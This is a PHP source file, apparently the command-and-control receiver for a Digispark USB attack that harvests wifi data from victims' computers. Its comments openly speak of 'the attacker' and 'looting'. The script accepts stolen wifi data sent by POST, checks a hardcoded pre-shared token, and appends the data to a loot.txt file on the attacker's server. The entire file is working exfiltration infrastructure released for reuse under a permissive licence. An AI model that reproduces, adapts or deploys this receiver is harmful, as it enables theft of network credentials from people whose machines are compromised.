<?php

/*
Copyright (c) 2019 Hassan Shehata
Permission is hereby granted, free of charge,
to any person obtaining a copy of this software and associated documentation files
(the "Software"), to deal in the Software without restriction,
including without limitation the rights to use, copy, modify, merge,
publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so
*/

//This script handles collected wifi data
//It verifies the request with pre-shared token "Hardcoded by the attacker into the Digispark"
//Then append the result to loot.txt file on the CnC system

$data=""; //will contain the collected wifi data

//Verify on POST paramter token
function verfiy($r_token,$data){
        $token="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"; //Initialize Token (32 digit)
        //echo "Token is >> ". $r_token. "\n"; //testing
        if ($r_token == $token) {
                loot(0,$data);
                //echo "Token valid looting..."; //testing
        } else {
                loot(1,$data);
                // echo "Token invalid dropping..."; //testing
        }
}

//Open loot file append mode only and write the keys paramter
function loot($flag,$data){
        $file="loot/loot.txt";  // make sure of the permissions on file.
        $content= file_get_contents($file);
        if ($flag == 0) {
                $content .= "[[DATA]] ".$data."\n";
                //echo "all good";
        } else {
                $content .= "[[ERROR]] invalid token"."\n";
                //echo "bad";
        }
        file_put_contents($file,$content);
}

// Request Handling
if( $_POST["token"] && $_POST["data"] ) {
        verfiy($_POST['token'],$_POST['data']);
    exit();
}
?>
